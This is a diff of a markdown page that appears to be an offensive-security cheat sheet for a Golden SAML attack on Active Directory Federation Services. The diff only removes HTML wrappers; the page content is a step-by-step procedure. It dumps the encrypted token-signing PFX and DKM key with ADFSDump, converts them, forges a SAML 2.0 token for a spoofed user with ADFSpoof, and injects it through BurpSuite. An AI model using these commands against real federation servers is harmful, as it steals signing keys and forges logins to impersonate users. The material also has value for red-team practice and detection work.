@@ -11,20 +11,14 @@ tags: ["ADFS", "active driectory", "ad", "Windows", "Federation Services", "SAML
 
 #### 1. Dump encrypted PFX and DKM key
 
-<div>
-
 ```console
 # With ADFS service account
 .\ADFSDump.exe
 ```
 
-</div>
-
 <small>*Ref: [ADFSDump](https://github.com/mandiant/ADFSDump)*</small>
 
 #### 2. Convert to binary blob
-
-<div>
 
 ```console
 # Copy private key(s)
@@ -36,35 +30,23 @@ echo '<PRIVATE_KEY>' | sed 's/-//g' | xxd -r -p > DkmKey.bin
 cat b64_blob | base64 -d > EncryptedPfx.bin
 ```
 
-</div>
-
 #### 3. Check which private key is correct
-
-<div>
 
 ```console
 # The correct key will not show error
 python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
 ```
 
-</div>
-
 <small>*Ref: [ADFSpoof](https://github.com/mandiant/ADFSpoof)*</small>
 
 #### 4. Generate SAML 2.0 token
-
-<div>
 
 ```console
 # Copy info from ADFS dump
 python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <SERVER> saml2 --endpoint <SIGN_IN_ENDPOINT> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <SPOOF_USER>@<DOMAIN> --rpidentifier <IDENTIFIER> --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue><SPOOF_USER>@<DOMAIN></AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue><SPOOF_USER></AttributeValue></Attribute>' 
 ```
 
-</div>
-
 #### 5. Modify request in BurpSuite
-
-<div>
 
 ```console
 +-------------------------------------------------------------+
@@ -76,8 +58,4 @@ python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <SERVER> saml2 --endpoint <
 +-------------------------------------------------------------+
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
